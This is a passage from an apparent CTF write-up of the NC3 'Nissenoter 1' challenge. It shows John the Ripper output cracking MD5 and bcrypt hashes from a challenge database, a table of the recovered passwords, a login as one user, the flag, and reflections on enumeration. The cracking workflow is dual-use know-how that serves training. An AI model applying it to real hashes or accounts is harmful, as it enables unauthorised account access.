+</span></span><span style=display:flex><span>merrychristmas <span style=color:#f92672>(</span>komet<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>julemand <span style=color:#f92672>(</span>hansi<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>christmastime <span style=color:#f92672>(</span>danser<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>ilovechristmas <span style=color:#f92672>(</span>konge<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>commander007 <span style=color:#f92672>(</span>rudolf<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>!happiness! <span style=color:#f92672>(</span>lyn<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>14g 0:00:00:00 DONE <span style=color:#f92672>(</span>2023-12-15 10:00<span style=color:#f92672>)</span> 21.21g/s 21725Kp/s 21725Kc/s 36620KC/s
+</span></span><span style=display:flex><span>!hector..!fqbn9a?
+</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show --format=Raw-MD5&#34;</span> options to display all of the cracked
+</span></span><span style=display:flex><span>passwords reliably
+</span></span><span style=display:flex><span>Session completed.
+</span></span></code></pre></div><p>Perfect, we got all the MD5 hashes from rockyou within seconds, now let&rsquo;s start cracking the Bcrypt passwords, which might take a bit longer.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ john bcrypt_hashes.txt --wordlist<span style=color:#f92672>=</span>custom_wordlist.txt
+</span></span><span style=display:flex><span>Using default input encoding: UTF-8
+</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>14</span> password hashes with <span style=color:#ae81ff>14</span> different salts <span style=color:#f92672>(</span>bcrypt <span style=color:#f92672>[</span>Blowfish 32/64 X3<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>16</span> <span style=color:#66d9ef>for</span> all loaded hashes
+</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>4</span> OpenMP threads
+</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
+</span></span><span style=display:flex><span>christmastime <span style=color:#f92672>(</span>danser<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>christmas <span style=color:#f92672>(</span>torden<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>commander007 <span style=color:#f92672>(</span>rudolf<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>julemand <span style=color:#f92672>(</span>hansi<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>chocolate <span style=color:#f92672>(</span>gunter<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>5g 0:00:00:00 DONE <span style=color:#f92672>(</span>2023-12-15 13:37<span style=color:#f92672>)</span> 100.0g/s 300.0p/s 4200c/s 4200C/s
+</span></span><span style=display:flex><span><span style=color:#ae81ff>12345678</span>
+</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style=display:flex><span>Session completed.
+</span></span></code></pre></div><p>We managed to crack the Bcrypt passwords, despite it taking close to an hour! It doesn&rsquo;t however appear that they changed their passwords. This leaves us the following credential notes</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>|   Password     |   Username   |
+</span></span><span style=display:flex><span>| -------------- | ------------ |
+</span></span><span style=display:flex><span>| 12345678       | (smukke)     |
+</span></span><span style=display:flex><span>| chocolate      | (gunter)     |
+</span></span><span style=display:flex><span>| password1      | (springer)   |
+</span></span><span style=display:flex><span>| abcdef         | (fritz)      |
+</span></span><span style=display:flex><span>| christmas      | (torden)     |
+</span></span><span style=display:flex><span>| midnight1      | (olufsand)   |
+</span></span><span style=display:flex><span>| beautiful!     | (amor)       |
+</span></span><span style=display:flex><span>| nooneknows     | (nissen)     |
+</span></span><span style=display:flex><span>| merrychristmas | (komet)      |
+</span></span><span style=display:flex><span>| julemand       | (hansi)      |
+</span></span><span style=display:flex><span>| christmastime  | (danser)     |
+</span></span><span style=display:flex><span>| ilovechristmas | (konge)      |
+</span></span><span style=display:flex><span>| commander007   | (rudolf)     |
+</span></span><span style=display:flex><span>| !happiness!    | (lyn)        |
+</span></span></code></pre></div><p>When we try to login, we identify invalid credentials for &ldquo;smukke&rdquo;, which might idendicate a disabled user, so we try &ldquo;gunter&rdquo; instead, which yields a valid login!</p><p>Now the next stage of enumeration can commence, seeing as we have managed to establish a foothold on the webapp.</p><h3 id=getting-first-flag>Getting first flag<a href=#getting-first-flag class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>We quickly check out the headers navigation links &ldquo;Forsiden&rdquo;, &ldquo;Profil&rdquo; & &ldquo;Noter&rdquo;, the latter being an instant success for our flag for Nissenoter 1!</p><p><img src=/nc3/boot2root/nissenoter-1/images/Noter%20with%20flag.png alt="Noter with flag"></p><p><img src=/nc3/boot2root/nissenoter-1/images/First%20flag.png alt="First flag"></p><p>Thanks to &ldquo;rudolf&rdquo; we can submit the first flag and move on to <a href=/nc3/boot2root/nissenoter-2/>Nissenoter 2</a>!</p><h2 id=flag>Flag<a href=#flag class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>NC3{1. Get .git; 2. Get database; 3. ????; 4. Profit!}
+</span></span></code></pre></div><h2 id=reflections-and-learnings>Reflections and Learnings<a href=#reflections-and-learnings class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><h3 id=the-value-of-comprehensive-enumeration>The Value of Comprehensive Enumeration<a href=#the-value-of-comprehensive-enumeration class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>This challenge highlighted the importance of comprehensive enumeration in cybersecurity. The initial nmap scan revealed critical information about open ports and and the available git repository, guiding the subsequent investigation steps. It&rsquo;s a reminder that a thorough initial scan can save time and provide a clear direction for exploration.</p><h3 id=importance-of-exploring-unconventional-avenues>Importance of Exploring Unconventional Avenues<a href=#importance-of-exploring-unconventional-avenues class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>Discovering the git repository and the SQLite database demonstrated the value of exploring unconventional avenues. These findings were not immediately apparent and required a deep dive into the server&rsquo;s structure. This emphasizes the need to think outside the box and consider non-obvious attack vectors.</p><h3 id=persistence-and-attention-to-detail-in-password-cracking>Persistence and Attention to Detail in Password Cracking<a href=#persistence-and-attention-to-detail-in-password-cracking class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>Cracking the password hashes, particularly the bcrypt hashes, required persistence and attention to detail. The successful cracking of these passwords underlines the importance of having a comprehensive wordlist like rockyou and the capability to recognize and leverage different hash types.</p></div></main><footer id=site-footer class="section-inner thin animated fadeIn faster"><p>&copy; 2025 <a href=https://ctf.adamino.dk/>Adamino</a>
+&#183; The quieter you become the more you are able to hear
+&#183;</p></footer><a href=# class=scroll-up><svg fill="#3b3e48" width="64" height="64" viewBox="-2.4 -2.4 28.8 28.8" id="up-circle" data-name="Flat Color" class="icon flat-color" stroke="#3b3e48" stroke-width=".00024000000000000003"><g id="SVGRepo_bgCarrier" stroke-width="0"/><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#ccc" stroke-width=".9600000000000002"><circle id="primary" cx="12" cy="12" r="10" style="fill:#3b3e48"/><path id="secondary" d="M15 14a1 1 0 01-.71-.29L12 11.41l-2.29 2.3a1 1 0 01-1.42-1.42l3-3a1 1 0 011.42.0l3 3a1 1 0 010 1.42A1 1 0 0115 14z" style="fill:#0077b6"/></g><g id="SVGRepo_iconCarrier"><circle id="primary" cx="12" cy="12" r="10" style="fill:#3b3e48"/><path id="secondary" d="M15 14a1 1 0 01-.71-.29L12 11.41l-2.29 2.3a1 1 0 01-1.42-1.42l3-3a1 1 0 011.42.0l3 3a1 1 0 010 1.42A1 1 0 0115 14z" style="fill:#0077b6"/></g></svg></a><noscript><a href=# class="scroll-up show"><svg fill="#3b3e48" width="64" height="64" viewBox="-2.4 -2.4 28.8 28.8" id="up-circle" data-name="Flat Color" class="icon flat-color" stroke="#3b3e48" stroke-width=".00024000000000000003"><g id="SVGRepo_bgCarrier" stroke-width="0"/><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#ccc" stroke-width=".9600000000000002"><circle id="primary" cx="12" cy="12" r="10" style="fill:#3b3e48"/><path id="secondary" d="M15 14a1 1 0 01-.71-.29L12 11.41l-2.29 2.3a1 1 0 01-1.42-1.42l3-3a1 1 0 011.42.0l3 3a1 1 0 010 1.42A1 1 0 0115 14z" style="fill:#0077b6"/></g><g id="SVGRepo_iconCarrier"><circle id="primary" cx="12" cy="12" r="10" style="fill:#3b3e48"/><path id="secondary" d="M15 14a1 1 0 01-.71-.29L12 11.41l-2.29 2.3a1 1 0 01-1.42-1.42l3-3a1 1 0 011.42.0l3 3a1 1 0 010 1.42A1 1 0 0115 14z" style="fill:#0077b6"/></g></svg></a></noscript><script async src=https://ctf.adamino.dk/js/scrollwatcher.min.11bd2ce6f91dfb64095448b76ac1930124a42dc7133488e6d3d5aae7badaf562.js integrity="sha256-Eb0s5vkd+2QJVEi3asGTASSkLccTNIjm09Wq57ra9WI=" crossorigin=anonymous></script><script async src=https://ctf.adamino.dk/js/bundle.min.038214de9d568246fadcfeb06c69349925de3209f332ec123861b6aa031d63c6.js integrity="sha256-A4IU3p1Wgkb63P6wbGk0mSXeMgnzMuwSOGG2qgMdY8Y=" crossorigin=anonymous></script></body></html>
